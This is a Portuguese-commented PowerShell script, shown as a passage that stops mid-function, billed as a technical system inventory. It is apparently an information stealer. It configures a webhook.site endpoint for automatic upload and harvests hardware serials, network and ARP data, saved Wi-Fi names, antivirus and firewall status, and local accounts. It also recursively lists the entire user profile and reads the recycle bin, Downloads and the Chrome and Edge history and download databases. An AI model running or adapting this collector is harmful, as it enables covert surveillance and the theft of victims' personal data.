
# Deixe vazio ('') se não quiser enviar automaticamente para webhook
$WebhookUrl = 'https://webhook.site/77d0d5d4-f7e9-43ac-810c-0bf2139be510'

# Pasta de exportação (padrão: %TEMP%\p)
$ExportDirDefault = Join-Path $env:TEMP 'p'
# Nome do arquivo de saída (padrão: %TEMP%\wifi_passwords.txt)

$OutputFileDefault = Join-Path $env:TEMP 'system_info.txt'
function Get-SystemInfo {
    [CmdletBinding()]
    param(
        [string]$OutputFile = $OutputFileDefault,
        [string]$ExportDir = $ExportDirDefault,
        [ValidateRange(1,5000)]
        [int]$RecentFiles = 100,
        [ValidateRange(1,5000)]
        [int]$BrowserEntries = 100
    )

    # Não usa SilentlyContinue globalmente: falhas individuais são tratadas pelo helper $try.
    $oldErrorActionPreference = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'

    $sb = [System.Text.StringBuilder]::new()
    $sep = '=' * 78
    $add = { param($x) [void]$sb.AppendLine([string]$x) }
    $sec = { param($x) & $add ''; & $add $x; & $add ('-' * 78) }
    $try = {
        param([scriptblock]$Block)
        try { & $Block } catch { $null }
    }
    $fmt = { param($Name,$Value) & $add ('{0,-21}: {1}' -f $Name,$Value) }
    $safeRound = {
        param($Value,$Digits=1)
        if($null -eq $Value -or $Value -eq '') { return '-' }
        try { return [math]::Round([double]$Value,$Digits) } catch { return '-' }
    }

    # -------------------------------------------------------------------------
    # Helper SQLite: usa uma cópia temporária e somente leitura.
    # -------------------------------------------------------------------------
    $sqliteProvider = $null
    $sqliteType = $null

    try {
        Add-Type -AssemblyName System.Data.SQLite -ErrorAction Stop
        $sqliteType = [System.Data.SQLite.SQLiteConnection]
        $sqliteProvider = 'System.Data.SQLite'
    } catch {}

    if(-not $sqliteType) {
        try {
            Add-Type -AssemblyName Microsoft.Data.Sqlite -ErrorAction Stop
            $sqliteType = [Microsoft.Data.Sqlite.SqliteConnection]
            $sqliteProvider = 'Microsoft.Data.Sqlite'
        } catch {}
    }

    $invokeBrowserSQLite = {
        param([string]$Database,[string]$Query)

        if(-not $sqliteType -or -not (Test-Path -Path $Database -PathType Leaf)) {
            return $null
        }

        $tmp = Join-Path $env:TEMP ('sysinfo_sqlite_{0}.db' -f ([guid]::NewGuid().ToString('N')))
        $cn = $null
        $cmd = $null
        $rd = $null

        try {
            Copy-Item -Path $Database -Destination $tmp -Force -ErrorAction Stop

            if($sqliteProvider -eq 'System.Data.SQLite') {
                $cn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp;Version=3;Read Only=True;")
            } else {
                $cn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$tmp;Mode=ReadOnly")
            }

            $cn.Open()
            $cmd = $cn.CreateCommand()
            $cmd.CommandText = $Query
            $rd = $cmd.ExecuteReader()

            $table = [System.Data.DataTable]::new()
            $table.Load($rd)
            return $table
        } catch {
            return $null
        } finally {
            if($rd){ try { $rd.Dispose() } catch {} }
            if($cmd){ try { $cmd.Dispose() } catch {} }
            if($cn){ try { $cn.Close() } catch {}; try { $cn.Dispose() } catch {} }
            Remove-Item -Path $tmp -Force -ErrorAction SilentlyContinue
        }
    }

    try {
        & $add $sep
        & $add 'INVENTÁRIO TÉCNICO COMPLETO DO SISTEMA'
        & $add "Coletado em: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        & $add $sep

        # =====================================================================
        # 01. IDENTIFICAÇÃO
        # =====================================================================
        & $sec '## 01. IDENTIFICAÇÃO'
        @(
            "Usuário              : $env:USERNAME"
            "Domínio              : $env:USERDOMAIN"
            "Domínio DNS          : $env:USERDNSDOMAIN"
            "Perfil               : $env:USERPROFILE"
            "Computador           : $env:COMPUTERNAME"
            "Processador PS       : $env:PROCESSOR_IDENTIFIER"
            "Arquitetura PS       : $env:PROCESSOR_ARCHITECTURE"
        ) | ForEach-Object { & $add $_ }

        $cs = & $try { Get-CimInstance Win32_ComputerSystem -ErrorAction Stop }
        $os = & $try { Get-CimInstance Win32_OperatingSystem -ErrorAction Stop }
        $reg = & $try { Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -ErrorAction Stop }

        if($cs) {
            & $fmt 'Fabricante' $cs.Manufacturer
            & $fmt 'Modelo' $cs.Model
            $cp = & $try { Get-CimInstance Win32_ComputerSystemProduct -ErrorAction Stop }
            if($cp) { & $fmt 'UUID' $cp.UUID }
            & $fmt 'Domínio/Workgroup' $(if($cs.PartOfDomain){ "Domínio: $($cs.Domain)" } else { "Workgroup: $($cs.Workgroup)" })
        }

        # =====================================================================
        # 02. SISTEMA OPERACIONAL
        # =====================================================================
        & $sec '## 02. SISTEMA OPERACIONAL / WINDOWS'
        if($os) {
            $build = if($reg.CurrentBuild) { "$($reg.CurrentBuild).$($reg.UBR)" } else { $os.BuildNumber }
            $uptime = '-'
            if($os.LastBootUpTime) {
                $uptime = (& $safeRound (((Get-Date) - $os.LastBootUpTime).TotalDays),1)
            }
            @(
                "Produto              : $($reg.ProductName)"
                "Display Version       : $($reg.DisplayVersion)"
                "Release ID            : $($reg.ReleaseId)"
                "Build                 : $build"
                "Versão WMI            : $($os.Version)"
                "Arquitetura           : $($os.OSArchitecture)"
                "Idioma                : $($os.MUILanguages -join ', ')"
                "Instalação            : $($os.InstallDate)"
                "Último Boot           : $($os.LastBootUpTime)"
                "Uptime (dias)         : $uptime"
                "Windows Directory     : $($os.WindowsDirectory)"
                "System Directory      : $($os.SystemDirectory)"
                "Product Type          : $($os.ProductType)"
                "Usuário registrado    : $($os.RegisteredUser)"
            ) | ForEach-Object { & $add $_ }
        }

        $lic = & $try { Get-CimInstance SoftwareLicensingProduct -ErrorAction Stop | Where-Object { $_.PartialProductKey -and $_.LicenseStatus -eq 1 } | Select-Object -First 1 }
        if($lic) { & $fmt 'Ativação Windows' 'Licenciado/Ativado' }

        # =====================================================================
        # 03. HARDWARE
        # =====================================================================
        & $sec '## 03. HARDWARE'
        $bios = & $try { Get-CimInstance Win32_BIOS -ErrorAction Stop }
        if($bios) {
            @(
                "BIOS                 : $($bios.Name)"
                "BIOS Fabricante      : $($bios.Manufacturer)"
                "BIOS Versão          : $($bios.SMBIOSBIOSVersion)"
                "BIOS Data            : $($bios.ReleaseDate)"
                "Serial               : $($bios.SerialNumber)"
            ) | ForEach-Object { & $add $_ }
        }

        $cpu = & $try { Get-CimInstance Win32_Processor -ErrorAction Stop | Select-Object -First 1 }
        if($cpu) {
            @(
                "CPU                  : $($cpu.Name)"
                "Cores                : $($cpu.NumberOfCores)"
                "Threads              : $($cpu.NumberOfLogicalProcessors)"
                "Clock Máx.           : $($cpu.MaxClockSpeed) MHz"
                "Clock Atual          : $($cpu.CurrentClockSpeed) MHz"
                "Cache L2             : $(& $safeRound ($cpu.L2CacheSize/1KB),0) KB"
                "Cache L3             : $(& $safeRound ($cpu.L3CacheSize/1KB),0) KB"
            ) | ForEach-Object { & $add $_ }
        }

        $ram = & $try { Get-CimInstance Win32_PhysicalMemory -ErrorAction Stop }
        if($ram) {
            & $add ''; & $add 'MEMÓRIA RAM:'
            $ram | ForEach-Object {
                & $add "  - $(& $safeRound ($_.Capacity/1GB),1) GB | $($_.Speed) MHz | $($_.Manufacturer) | $($_.PartNumber) | Slot: $($_.DeviceLocator)"
            }
        }

        $disks = & $try { Get-CimInstance Win32_DiskDrive -ErrorAction Stop }
        if($disks) {
            & $add ''; & $add 'DISCOS FÍSICOS:'
            $disks | ForEach-Object {
                & $add "  - $($_.Model) | $(& $safeRound ($_.Size/1GB),0) GB | Interface: $($_.InterfaceType) | Serial: $($_.SerialNumber) | Firmware: $($_.FirmwareRevision)"
            }
        }

        $parts = & $try { Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' -ErrorAction Stop }
        if($parts) {
            & $add ''; & $add 'VOLUMES:'
            $parts | ForEach-Object {
                $used = if($_.Size){ $_.Size - $_.FreeSpace } else { 0 }
                $freePct = if($_.Size){ & $safeRound (($_.FreeSpace/$_.Size)*100),1 } else { '-' }
                & $add "  - $($_.DeviceID) | FS: $($_.FileSystem) | Total: $(& $safeRound ($_.Size/1GB),2) GB | Usado: $(& $safeRound ($used/1GB),2) GB | Livre: $freePct%"
            }
        }

        $smart = & $try { Get-PhysicalDisk -ErrorAction Stop }
        if($smart) {
            & $add ''; & $add 'SAÚDE DOS DISCOS:'
            $smart | ForEach-Object {
                & $add "  - $($_.FriendlyName) | Tipo: $($_.MediaType) | Health: $($_.HealthStatus) | Operacional: $($_.OperationalStatus) | Tamanho: $(& $safeRound ($_.Size/1GB),0) GB"
            }
        }

        $gpus = & $try { Get-CimInstance Win32_VideoController -ErrorAction Stop }
        if($gpus) {
            & $add ''; & $add 'GPU / VÍDEO:'
            $gpus | ForEach-Object {
                & $add "  - $($_.Name) | Driver: $($_.DriverVersion) | Data: $($_.DriverDate) | VRAM: $(& $safeRound ($_.AdapterRAM/1GB),1) GB | Res: $($_.CurrentHorizontalResolution)x$($_.CurrentVerticalResolution)"
            }
        }

        $mon = & $try { Get-CimInstance Win32_DesktopMonitor -ErrorAction Stop }
        if($mon) {
            & $add ''; & $add 'MONITORES:'
            $mon | ForEach-Object { & $add "  - $($_.Name) | PNP: $($_.PNPDeviceID)" }
        }

        $devBad = & $try { Get-CimInstance Win32_PnPEntity -ErrorAction Stop | Where-Object { $_.ConfigManagerErrorCode -and $_.ConfigManagerErrorCode -ne 0 } }
        if($devBad) {
            & $add ''; & $add 'DISPOSITIVOS COM ERRO:'
            $devBad | ForEach-Object { & $add "  - $($_.Name) | Código: $($_.ConfigManagerErrorCode) | PNP: $($_.PNPDeviceID)" }
        }

        $bat = & $try { Get-CimInstance Win32_Battery -ErrorAction Stop }
        if($bat) {
            & $add ''; & $add 'BATERIA:'
            $bat | ForEach-Object {
                & $add "  - $($_.Name) | Status: $($_.BatteryStatus) | Design: $(& $safeRound ($_.DesignCapacity/1000),0) mWh | Atual: $(& $safeRound ($_.CurrentCapacity/1000),0) mWh"
            }
        }

        # =====================================================================
        # 04. REDE - somente informações locais
        # =====================================================================
        & $sec '## 04. REDE'
        $adapters = & $try { Get-NetAdapter -ErrorAction Stop }
        if($adapters) {
            & $add 'ADAPTADORES:'
            $adapters | ForEach-Object { & $add "  - $($_.Name) | $($_.InterfaceDescription) | Status: $($_.Status) | MAC: $($_.MacAddress) | Link: $($_.LinkSpeed)" }
        }

        $cfgs = & $try { Get-NetIPConfiguration -ErrorAction Stop }
        if($cfgs) {
            & $add ''; & $add 'CONFIGURAÇÕES IP:'
            $cfgs | ForEach-Object {
                $ip = if($_.IPv4Address){ $_.IPv4Address.IPAddress -join ', ' } else { '-' }
                $gw = if($_.IPv4DefaultGateway){ $_.IPv4DefaultGateway.NextHop -join ', ' } else { '-' }
                $dns = if($_.DnsServer){ $_.DnsServer.ServerAddresses -join ', ' } else { '-' }
                & $add "  - $($_.InterfaceAlias) | IPv4: $ip | GW: $gw | DNS: $dns | DHCP: $($_.IPv4DHCPEnabled)"
            }
        }

        $prof = & $try { Get-NetConnectionProfile -ErrorAction Stop }
        if($prof) {
            & $add ''; & $add 'PERFIL DE REDE:'
            $prof | ForEach-Object { & $add "  - $($_.InterfaceAlias) | Rede: $($_.Name) | Categoria: $($_.NetworkCategory) | IPv4: $($_.IPv4Connectivity) | IPv6: $($_.IPv6Connectivity)" }
        }

        $proxy = & $try { Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -ErrorAction Stop }
        if($proxy) { & $fmt 'Proxy' $(if($proxy.ProxyEnable){ "Ativo - $($proxy.ProxyServer)" } else { 'Desativado' }) }

        $route = & $try { Get-NetRoute -AddressFamily IPv4 -ErrorAction Stop | Where-Object { $_.NextHop -notin '0.0.0.0','255.255.255.255' } | Select-Object -First 30 }
        if($route) {
            & $add ''; & $add 'ROTAS:'
            $route | ForEach-Object { & $add "  - $($_.DestinationPrefix) | Gateway: $($_.NextHop) | Métrica: $($_.RouteMetric) | Interface: $($_.InterfaceAlias)" }
        }

        $arp = & $try { Get-NetNeighbor -ErrorAction Stop | Where-Object State -ne Unreachable | Select-Object -First 50 }
        if($arp) {
            & $add ''; & $add 'ARP:'
            $arp | ForEach-Object { & $add "  - $($_.IPAddress) | $($_.MacAddress) | $($_.State) | $($_.InterfaceAlias)" }
        }

        $wifi = & $try { netsh wlan show interfaces 2>$null }
        if($wifi) {
            & $add ''; & $add 'WI-FI ATUAL:'
            $wifi | Select-String '^(\s*)(SSID|BSSID|Radio type|Channel|Receive rate|Transmit rate|Signal|State)\s*:' | ForEach-Object { & $add "  - $($_.Line.Trim())" }
        }

        $profiles = & $try { netsh wlan show profiles 2>$null | Select-String '^\s*All User Profile\s*:\s*(.+)' | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() } }
        if($profiles) {
            & $add ''; & $add 'PERFIS WI-FI SALVOS (somente SSID):'
            $profiles | ForEach-Object { & $add "  - $_" }
        }

        # =====================================================================
        # 05. SEGURANÇA
        # =====================================================================
        & $sec '## 05. SEGURANÇA'
        $fw = & $try { Get-NetFirewallProfile -ErrorAction Stop }
        if($fw) { & $add "Firewall             : $(($fw | ForEach-Object { "$($_.Name): $(if($_.Enabled){'ON'}else{'OFF'})" }) -join ', ')" }

        $tpm = & $try { Get-Tpm -ErrorAction Stop }
        if($tpm) { @("TPM presente         : $($tpm.TpmPresent)","TPM pronto            : $($tpm.TpmReady)","TPM versão            : $($tpm.ManufacturerVersion)") | ForEach-Object { & $add $_ } }

        $sbv = & $try { Confirm-SecureBootUEFI -ErrorAction Stop }
        if($null -ne $sbv) { & $fmt 'Secure Boot' $(if($sbv){'Ativado'}else{'Desativado'}) }

        $bit = & $try { Get-BitLockerVolume -ErrorAction Stop }
        if($bit) { & $add 'BITLOCKER:'; $bit | ForEach-Object { & $add "  - $($_.MountPoint) | Status: $($_.VolumeStatus) | Proteção: $($_.ProtectionStatus) | Método: $($_.EncryptionMethod)" } }

        $av = & $try { Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntivirusProduct -ErrorAction Stop }
        if($av) { & $add ''; & $add 'ANTIVÍRUS:'; $av | ForEach-Object { & $add "  - $($_.DisplayName) | Status: $($_.productState)" } }

        $def = & $try { Get-MpComputerStatus -ErrorAction Stop }
        if($def) { @("Defender             : Ativo=$($def.AntivirusEnabled) | RT=$($def.RealTimeProtectionEnabled)","Assinatura Defender   : $($def.AntivirusSignatureLastUpdated)") | ForEach-Object { & $add $_ } }

        $uac = & $try { Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -ErrorAction Stop }
        if($uac) { & $fmt 'UAC' $(if($uac.EnableLUA){'Ativado'}else{'Desativado'}) }

        # =====================================================================
        # 06. WINDOWS UPDATE
        # =====================================================================
        & $sec '## 06. WINDOWS UPDATE / PATCHES'
        # InstalledOn pode chegar como string inválida em alguns sistemas.
        # Não usamos Sort-Object diretamente sobre InstalledOn porque isso pode
        # provocar conversão automática para DateTime e interromper a coleta.
        $hot = & $try {
            $hotfixes = @(Get-HotFix -ErrorAction Stop)

            $hotfixes | Sort-Object -Property @{
                Expression = {
                    $date = $null

                    if($_.InstalledOn -is [datetime]) {
                        $date = $_.InstalledOn
                    }
                    elseif($null -ne $_.InstalledOn -and [string]$_.InstalledOn -ne '') {
                        try {
                            $date = [datetime]::Parse(
                                [string]$_.InstalledOn,
                                [System.Globalization.CultureInfo]::CurrentCulture
                            )
                        }
                        catch {
                            try {
                                $date = [datetime]::Parse(
                                    [string]$_.InstalledOn,
                                    [System.Globalization.CultureInfo]::InvariantCulture
                                )
                            }
                            catch {}
                        }
                    }

                    if($null -eq $date) {
                        [datetime]::MinValue
                    }
                    else {
                        $date
                    }
                }
                Descending = $true
            }
        }

        if($hot) {
            $hot | Select-Object -First 20 | ForEach-Object {
                $installed = if($null -ne $_.InstalledOn -and [string]$_.InstalledOn -ne '') {
                    [string]$_.InstalledOn
                }
                else {
                    '[data inválida/indisponível]'
                }

                & $add "  - $($_.HotFixID) | $installed | $($_.Description)"
            }
        }

        $wu = & $try {
            $session = New-Object -ComObject Microsoft.Update.Session
            $searcher = $session.CreateUpdateSearcher()
            $result = $searcher.Search('IsInstalled=0')
            [pscustomobject]@{
                Last = $searcher.LastSearchSuccessDate
                Pending = $result.Updates
            }
        }
        if($wu) {
            @("Última busca         : $($wu.Last)","Pendentes             : $($wu.Pending.Count)") | ForEach-Object { & $add $_ }
            $wu.Pending | Select-Object -First 10 | ForEach-Object { & $add "  - $($_.Title)" }
        }

        # =====================================================================
        # 07. SOFTWARE / DRIVERS
        # =====================================================================
        & $sec '## 07. SOFTWARE / DRIVERS'
        $apps = & $try {
            Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction Stop |
                Where-Object DisplayName |
                Select-Object DisplayName,DisplayVersion,Publisher,InstallDate |
                Sort-Object DisplayName
        }
        if($apps) { $apps | Select-Object -First 100 | ForEach-Object { & $add "  - $($_.DisplayName) v$($_.DisplayVersion) | $($_.Publisher) | $($_.InstallDate)" } }

        $drivers = & $try {
            Get-CimInstance Win32_PnPSignedDriver -ErrorAction Stop |
                Where-Object DeviceName |
                Select-Object DeviceName,DriverVersion,DriverDate,Manufacturer |
                Sort-Object DeviceName
        }
        if($drivers) { & $add ''; & $add 'DRIVERS:'; $drivers | Select-Object -First 100 | ForEach-Object { & $add "  - $($_.DeviceName) | $($_.DriverVersion) | $($_.DriverDate) | $($_.Manufacturer)" } }

        # =====================================================================
        # 08. SERVIÇOS / INICIALIZAÇÃO
        # =====================================================================
        & $sec '## 08. SERVIÇOS / INICIALIZAÇÃO'
        $svc = & $try { Get-Service -ErrorAction Stop | Where-Object Status -eq Running | Sort-Object Name }
        if($svc) { $svc | Select-Object -First 100 | ForEach-Object { & $add "  - $($_.Name) | $($_.DisplayName) | $($_.StartType)" } }

        $run = @(
            'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
            'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
            'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
        )
        & $add 'INICIALIZAÇÃO (Run):'
        foreach($p in $run) {
            $x = & $try { Get-ItemProperty $p -ErrorAction Stop }
            if($x) {
                $x.PSObject.Properties | Where-Object Name -notmatch '^PS' | ForEach-Object { & $add "  - $($_.Name): $($_.Value)" }
            }
        }

        $startup = @("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup","$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp")
        & $add 'PASTAS STARTUP:'
        foreach($p in $startup) {
            & $try { Get-ChildItem $p -File -ErrorAction Stop | ForEach-Object { & $add "  - $($_.FullName)" } }
        }

        $tasks = & $try { Get-ScheduledTask -ErrorAction Stop | Where-Object { $_.State -ne 'Disabled' -and $_.TaskPath -notlike '\Microsoft\*' } | Select-Object TaskName,TaskPath,State }
        if($tasks) { & $add ''; & $add 'TAREFAS AGENDADAS (TERCEIROS):'; $tasks | Select-Object -First 100 | ForEach-Object { & $add "  - $($_.TaskPath)$($_.TaskName) | $($_.State)" } }

        # =====================================================================
        # 09. USUÁRIOS / COMPARTILHAMENTOS
        # =====================================================================
        & $sec '## 09. USUÁRIOS / COMPARTILHAMENTOS'
        $users = & $try { Get-LocalUser -ErrorAction Stop }
        if($users) { $users | ForEach-Object { & $add "  - $($_.Name) | Ativo: $($_.Enabled) | Último Login: $($_.LastLogon) | Senha: $($_.PasswordLastSet)" } }

        $admins = & $try { Get-LocalGroupMember Administrators -ErrorAction Stop }
        if($admins) { & $add ''; & $add 'ADMINISTRADORES:'; $admins | ForEach-Object { & $add "  - $($_.Name) | $($_.ObjectType)" } }

        $shares = & $try { Get-SmbShare -ErrorAction Stop }
        if($shares) { & $add ''; & $add 'COMPARTILHAMENTOS SMB:'; $shares | ForEach-Object { & $add "  - $($_.Name) | $($_.Path) | $($_.ShareType)" } }

        $mapped = & $try { Get-PSDrive -PSProvider FileSystem -ErrorAction Stop | Where-Object DisplayRoot }
        if($mapped) { & $add ''; & $add 'DRIVES MAPEADOS:'; $mapped | ForEach-Object { & $add "  - $($_.Name): -> $($_.DisplayRoot)" } }

        # =====================================================================
        # 10. PROCESSOS / DIAGNÓSTICO
        # =====================================================================
        & $sec '## 10. PROCESSOS / DIAGNÓSTICO'
        $proc = & $try { Get-Process -ErrorAction Stop | Sort-Object WorkingSet64 -Descending | Select-Object -First 30 }
        if($proc) {
            $proc | ForEach-Object {
                $cpuTime = & $try { $_.CPU }
                $cpuText = if($null -eq $cpuTime){'-'}else{ & $safeRound $cpuTime,1 }
                & $add "  - $($_.ProcessName) | PID: $($_.Id) | Mem: $(& $safeRound ($_.WorkingSet64/1MB),1) MB | CPU: ${cpuText}s"
            }
        }

        $listen = & $try { netstat -ano 2>$null | Select-String LISTENING | Select-Object -First 50 }
        if($listen) { & $add ''; & $add 'PORTAS EM ESCUTA:'; $listen | ForEach-Object { & $add "  - $($_.Line.Trim())" } }

        $est = & $try { netstat -ano 2>$null | Select-String ESTABLISHED | Select-Object -First 50 }
        if($est) { & $add ''; & $add 'CONEXÕES ESTABELECIDAS:'; $est | ForEach-Object { & $add "  - $($_.Line.Trim())" } }

        $events = & $try { Get-WinEvent -FilterHashtable @{LogName='System';Level=1,2;StartTime=(Get-Date).AddDays(-7)} -MaxEvents 50 -ErrorAction Stop }
        if($events) {
            & $add ''; & $add 'ERROS/CRÍTICOS DO SYSTEM (7 DIAS):'
            $events | ForEach-Object {
                $message = if($_.Message){ $_.Message -replace '\s+',' ' } else { '' }
                if($message.Length -gt 180){ $message = $message.Substring(0,180) }
                & $add "  - $($_.TimeCreated) | ID $($_.Id) | $($_.ProviderName) | $message"
            }
        }

        $appEvents = & $try { Get-WinEvent -FilterHashtable @{LogName='Application';Level=1,2;StartTime=(Get-Date).AddDays(-7)} -MaxEvents 50 -ErrorAction Stop }
        if($appEvents) {
            & $add ''; & $add 'ERROS/CRÍTICOS DE APLICATIVOS (7 DIAS):'
            $appEvents | ForEach-Object {
                $message = if($_.Message){ $_.Message -replace '\s+',' ' } else { '' }
                if($message.Length -gt 180){ $message = $message.Substring(0,180) }
                & $add "  - $($_.TimeCreated) | ID $($_.Id) | $($_.ProviderName) | $message"
            }
        }

        $dumps = & $try { Get-ChildItem "$env:SystemRoot\Minidump\*.dmp" -File -ErrorAction Stop }
        if($dumps) {
            & $add ''; & $add 'MINIDUMPS:'
            $dumps | Sort-Object LastWriteTime -Descending | Select-Object -First 20 | ForEach-Object {
                & $add "  - $($_.FullName) | $($_.LastWriteTime) | $(& $safeRound ($_.Length/1MB),1) MB"
            }
        }

        # =====================================================================
        # 11. ARQUIVOS RECENTES
        # =====================================================================
        & $sec '## 11. ARQUIVOS RECENTES / PERFIL DO USUÁRIO / LIXEIRA / DESKTOP'
        & $add "Limite: $RecentFiles por categoria"

        $recentRoot = Join-Path $env:APPDATA 'Microsoft\Windows\Recent'
        $recent = & $try { Get-ChildItem $recentRoot -File -ErrorAction Stop | Sort-Object LastWriteTime -Descending | Select-Object -First $RecentFiles }
        if($recent) {
            & $add 'ITENS DA PASTA RECENTES DO WINDOWS:'
            $recent | ForEach-Object { & $add "  - $($_.LastWriteTime) | $($_.Name) | $($_.FullName)" }
        }

        # ------------------------------------------------------------
        # TODOS OS ARQUIVOS E PASTAS DO PERFIL DO USUÁRIO
        # ------------------------------------------------------------
        & $add ''
        & $add 'TODOS OS ARQUIVOS E PASTAS DO PERFIL DO USUÁRIO:'
        & $add "Raiz: $env:USERPROFILE"

        $userItems = & $try {
            Get-ChildItem -Path $env:USERPROFILE -Force -Recurse -ErrorAction SilentlyContinue |
                Sort-Object FullName
        }

        if($userItems) {
            foreach($item in $userItems) {
                $itemType = if($item.PSIsContainer) { 'PASTA' } else { 'ARQUIVO' }
                $itemSize = if($item.PSIsContainer) {
                    '-'
                } else {
                    "$(& $safeRound ($item.Length/1KB),1) KB"
                }

                & $add "  - [$itemType] $($item.FullName) | Modificado: $($item.LastWriteTime) | Tamanho: $itemSize"
            }
        }
        else {
            & $add '  [nenhum item encontrado ou acesso indisponível]'
        }

        # ------------------------------------------------------------
        # ITENS DA LIXEIRA
        # ------------------------------------------------------------
        & $add ''
        & $add 'ITENS DA LIXEIRA:'

        $recycleItems = & $try {
            $shell = New-Object -ComObject Shell.Application
            $recycleBin = $shell.Namespace(0xA)

            if($recycleBin) {
                $recycleBin.Items()
            }
        }

        if($recycleItems) {
            foreach($item in $recycleItems) {
                $originalPath = & $try { $recycleBin.GetDetailsOf($item, 1) }
                $deletedDate  = & $try { $recycleBin.GetDetailsOf($item, 2) }

                if([string]::IsNullOrWhiteSpace($originalPath)) { $originalPath = '[indisponível]' }
                if([string]::IsNullOrWhiteSpace($deletedDate))  { $deletedDate  = '[indisponível]' }

                & $add "  - $($item.Name) | Tipo: $($item.Type) | Caminho original: $originalPath | Data: $deletedDate"
            }
        }
        else {
            & $add '  [lixeira vazia ou indisponível]'
        }

        $downloadsRoot = Join-Path $env:USERPROFILE 'Downloads'
        $downloads = & $try { Get-ChildItem $downloadsRoot -File -Force -ErrorAction Stop | Sort-Object LastWriteTime -Descending | Select-Object -First $RecentFiles }
        & $add ''; & $add 'ARQUIVOS PRESENTES EM DOWNLOADS:'
        if($downloads) { $downloads | ForEach-Object { & $add "  - $($_.LastWriteTime) | $(& $safeRound ($_.Length/1KB),1) KB | $($_.Name) | $($_.FullName)" } }
        else { & $add '  [nenhum arquivo encontrado ou pasta indisponível]' }

        $desktopRoot = [Environment]::GetFolderPath('Desktop')
        $desktop = & $try {
            Get-ChildItem -Path $desktopRoot -Force -ErrorAction Stop |
                Sort-Object Name
        }

        & $add ''
        & $add 'ITENS PRESENTES NA ÁREA DE TRABALHO:'

        if($desktop) {
            foreach($item in $desktop) {
                if($item.PSIsContainer) {
                    $desktopType = 'PASTA'
                }
                elseif($item.Extension -ieq '.lnk' -or $item.Extension -ieq '.url') {
                    $desktopType = 'ATALHO'
                }
                else {
                    $desktopType = 'ARQUIVO'
                }

                $desktopSize = if($item.PSIsContainer) {
                    '-'
                } else {
                    "$(& $safeRound ($item.Length/1KB),1) KB"
                }

                & $add "  - [$desktopType] $($item.Name) | $($item.FullName) | Modificado: $($item.LastWriteTime) | Tamanho: $desktopSize"
            }
        }
        else {
            & $add '  [nenhum item encontrado ou Desktop indisponível]'
        }

        $scan = @("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads")
        $files = & $try {
            Get-ChildItem $scan -File -Force -ErrorAction Stop |
                Where-Object FullName -notmatch '\\AppData\\' |
                Sort-Object LastWriteTime -Descending |
                Select-Object -First $RecentFiles
        }
        if($files) {
            & $add ''; & $add 'ARQUIVOS RECENTEMENTE MODIFICADOS:'
            $files | ForEach-Object { & $add "  - $($_.LastWriteTime) | $(& $safeRound ($_.Length/1KB),1) KB | $($_.FullName)" }
        }

        # =====================================================================
        # 12. NAVEGADORES
        # =====================================================================
        & $sec '## 12. NAVEGADORES / HISTÓRICO / DOWNLOADS / FAVORITOS / EXTENSÕES'

        $browserRoots = @(
            [pscustomobject]@{ Name='Google Chrome'; UserRoot="$env:LOCALAPPDATA\Google\Chrome\User Data" },
            [pscustomobject]@{ Name='Microsoft Edge'; UserRoot="$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
            [pscustomobject]@{ Name='Mozilla Firefox'; UserRoot="$env:APPDATA\Mozilla\Firefox\Profiles" }
        )

        foreach($browser in $browserRoots) {
            if(-not (Test-Path -Path $browser.UserRoot -PathType Container)) { continue }

            & $add ''; & $add $browser.Name.ToUpper(); & $add ('-' * 78)

            if($browser.Name -ne 'Mozilla Firefox') {
                $profiles = & $try {
                    Get-ChildItem $browser.UserRoot -Directory -ErrorAction Stop |
                        Where-Object { $_.Name -eq 'Default' -or $_.Name -like 'Profile *' } |
                        Sort-Object Name
                }

                foreach($profile in $profiles) {
                    & $add ''; & $add "PERFIL: $($profile.Name)"
                    $historyDb = Join-Path $profile.FullName 'History'

                    if(Test-Path -Path $historyDb -PathType Leaf) {
                        if($sqliteType) {
                            $q = @"
SELECT
    urls.url AS URL,
    urls.title AS Titulo,
    datetime((visits.visit_time/1000000)-11644473600,'unixepoch','localtime') AS Data,
    visits.visit_duration AS Duracao
FROM visits
JOIN urls ON visits.url=urls.id
ORDER BY visits.visit_time DESC
LIMIT $BrowserEntries
"@
                            $hist = & $invokeBrowserSQLite $historyDb $q
                            & $add 'HISTÓRICO DE NAVEGAÇÃO:'
                            if($hist) { $hist | ForEach-Object { & $add "  - $($_.Data) | $($_.Titulo) | $($_.URL)" } }
                            else { & $add '  [histórico localizado, mas não foi possível consultar o banco]' }

                            $q = @"
SELECT
    target_path AS Arquivo,
    tab_url AS URL,
    datetime((start_time/1000000)-11644473600,'unixepoch','localtime') AS Data
FROM downloads
ORDER BY start_time DESC
LIMIT $BrowserEntries
"@
                            $dl = & $invokeBrowserSQLite $historyDb $q
                            & $add ''; & $add 'DOWNLOADS DO NAVEGADOR:'
                            if($dl) { $dl | ForEach-Object { & $add "  - $($_.Data) | $($_.Arquivo) | Origem: $($_.URL)" } }
                            else { & $add '  [nenhum registro de download disponível]' }
                        } else {
                            & $add '  [SQLite não disponível para consulta deste banco]'
                        }
                    }

                    $bookmark = Join-Path $profile.FullName 'Bookmarks'
                    if(Test-Path -Path $bookmark -PathType Leaf) {
                        & $add ''; & $add 'FAVORITOS:'
                        try {
